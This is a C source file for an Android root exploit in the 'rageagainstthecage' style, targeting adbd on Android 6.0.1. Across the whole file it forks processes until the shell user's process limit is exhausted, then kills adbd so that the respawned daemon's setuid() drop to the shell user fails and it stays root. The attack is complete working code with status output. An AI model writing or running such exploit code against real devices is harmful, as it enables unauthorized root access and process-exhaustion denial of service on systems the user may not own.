/*
 * adbd_root.c — Modern rageagainstthecage for Android 6.0.1
 *
 * Classic exploit: exhaust RLIMIT_NPROC so adbd's setuid() fails,
 * leaving it running as root after respawn.
 *
 * On Android 6.0.1, adbd checks setuid return and may exit.
 * But we try anyway — Samsung may have a different adbd build.
 *
 * Also tries: kill zygote to force respawn with uid exhaustion.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>

static int get_adbd_pid(void) {
    DIR *d = opendir("/proc");
    if (!d) return -1;
    
    struct dirent *de;
    while ((de = readdir(d))) {
        if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
        
        char path[256];
        snprintf(path, sizeof(path), "/proc/%s/cmdline", de->d_name);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        
        char cmd[256] = {0};
        fread(cmd, 1, sizeof(cmd)-1, f);
        fclose(f);
        
        if (strstr(cmd, "adbd")) {
            closedir(d);
            return atoi(de->d_name);
        }
    }
    closedir(d);
    return -1;
}

int main(void) {
    printf("=== adbd root exploit (rageagainstthecage style) ===\n");
    printf("[*] uid=%d pid=%d\n", getuid(), getpid());
    
    /* Get current NPROC limits */
    struct rlimit rl;
    getrlimit(RLIMIT_NPROC, &rl);
    printf("[*] RLIMIT_NPROC: soft=%lu hard=%lu\n", 
           (unsigned long)rl.rlim_cur, (unsigned long)rl.rlim_max);
    
    /* Find adbd PID */
    int adbd_pid = get_adbd_pid();
    printf("[*] adbd PID: %d\n", adbd_pid);
    
    if (adbd_pid <= 0) {
        printf("[-] Cannot find adbd\n");
        return 1;
    }
    
    /* Count current processes for our UID */
    int current_procs = 0;
    DIR *d = opendir("/proc");
    if (d) {
        struct dirent *de;
        while ((de = readdir(d))) {
            if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
            char path[256];
            snprintf(path, sizeof(path), "/proc/%s/status", de->d_name);
            FILE *f = fopen(path, "r");
            if (!f) continue;
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line, "Uid:", 4) == 0) {
                    int uid;
                    sscanf(line + 4, "%d", &uid);
                    if (uid == (int)getuid()) current_procs++;
                    break;
                }
            }
            fclose(f);
        }
        closedir(d);
    }
    printf("[*] Current processes for uid %d: %d\n", getuid(), current_procs);
    
    /* Fork processes until we hit the limit */
    int target = rl.rlim_cur;
    int forked = 0;
    printf("[*] Forking to fill NPROC limit (%lu)...\n", (unsigned long)target);
    
    /* We need to leave exactly ONE slot free for adbd to start,
     * but have setuid() fail when it tries to change UID.
     * Actually, setuid() fails if the target UID already has
     * RLIMIT_NPROC processes. So we need to fill the limit for
     * the shell UID (2000), but adbd respawns as root first
     * and THEN tries to setuid to shell.
     *
     * Wait — adbd on Android 6 drops to shell (2000).
     * So if UID 2000 has maxed out NPROC, setuid(2000) fails.
     * adbd stays as root!
     *
     * BUT: does adbd check the return of setuid? On AOSP 6.0:
     * It calls setuid(AID_SHELL) and checks != 0, then exits.
     * Samsung might have modified this...
     */
    
    /* Fork children that just sleep */
    int need = target - current_procs - 2; /* leave 2 slots buffer */
    if (need < 0) need = 0;
    if (need > 10000) need = 10000;
    
    printf("[*] Need to fork %d more processes\n", need);
    
    int *child_pids = malloc(need * sizeof(int));
    for (int i = 0; i < need; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            /* Child: just sleep forever */
            while(1) pause();
            exit(0);
        } else if (pid < 0) {
            printf("[*] Fork failed at iteration %d: %s\n", i, strerror(errno));
            forked = i;
            break;
        }
        child_pids[i] = pid;
        forked++;
        
        if (i % 1000 == 0 && i > 0)
            printf("[*] Forked %d processes...\n", i);
    }
    
    printf("[+] Forked %d processes total\n", forked);
    printf("[*] Process limit should be nearly exhausted\n");
    
    /* Now kill adbd */
    printf("[*] Killing adbd (PID %d)...\n", adbd_pid);
    printf("[!] This will disconnect your ADB session!\n");
    printf("[!] Reconnect with 'adb shell' — if you get root, it worked!\n");
    printf("[*] Waiting 2 seconds before kill...\n");
    fflush(stdout);
    sleep(2);
    
    kill(adbd_pid, SIGKILL);
    
    /* After killing adbd, init will respawn it.
     * The new adbd starts as root.
     * When it tries setuid(2000), if NPROC is full, it fails.
     * If Samsung's adbd doesn't check, we get root adb.
     * If it does check and exits, init respawns again → loop.
     *
     * We wait briefly, then clean up our forked children.
     */
    sleep(5);
    
    /* Clean up children */
    for (int i = 0; i < forked; i++) {
        kill(child_pids[i], SIGKILL);
    }
    for (int i = 0; i < forked; i++) {
        waitpid(child_pids[i], NULL, WNOHANG);
    }
    free(child_pids);
    
    printf("[*] Cleaned up forked processes\n");
    printf("[*] Check: id = uid=%d\n", getuid());
    
    return 0;
}
